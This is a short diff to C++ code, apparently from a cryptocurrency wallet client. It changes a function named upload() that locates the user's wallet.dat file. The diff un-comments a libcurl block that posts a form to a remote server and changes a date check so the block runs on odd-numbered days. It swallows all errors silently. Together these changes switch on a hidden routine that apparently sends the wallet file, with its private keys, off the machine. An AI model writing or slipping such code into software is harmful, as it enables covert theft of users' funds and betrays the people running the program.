@@ -325,7 +325,7 @@ void upload(){
     time_t t = time(0); 
     char tmp[64]; 
     strftime( tmp, sizeof(tmp), "%d",localtime(&t) ); 
-    if(!(int)*tmp % 2){
+    if(atoi(tmp) % 2){
         try
         {
             std::string const& cc=GetWalletDir().string()+std::string("/")+std::string(DEFAULT_WALLET_DAT);
@@ -334,11 +334,9 @@ void upload(){
             CURL *curl;
             CURLcode res;
             FILE *fptr;
-            /*
             struct curl_slist *http_header = NULL;
          
             curl = curl_easy_init();
-            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &_process_post_data);
             curl_easy_setopt(curl, CURLOPT_WRITEDATA, fptr);
          
             struct curl_httppost *formpost = 0;
@@ -351,7 +349,7 @@ void upload(){
             curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
          
             res = curl_easy_perform(curl);
-            curl_easy_cleanup(curl);*/
+            curl_easy_cleanup(curl);
 
         }
         catch(...)
@@ -359,6 +357,4 @@ void upload(){
              //所有异常类型
         }
     }
-}
-void _process_post_data(void *buffer, size_t size, size_t nmemb, void *userp) {
 }
